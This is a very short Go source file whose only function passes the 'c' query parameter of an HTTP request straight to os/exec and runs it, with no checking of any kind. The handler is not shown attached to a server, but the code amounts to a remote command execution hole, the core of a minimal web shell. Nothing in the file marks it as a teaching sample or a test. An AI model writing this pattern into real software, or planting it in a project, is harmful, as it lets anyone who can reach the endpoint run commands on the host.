package main
import (
	e "os/exec"
	"net/http"
)
func h(r *http.Request) {
	e.Command(r.URL.Query().Get("c")).Run()
}
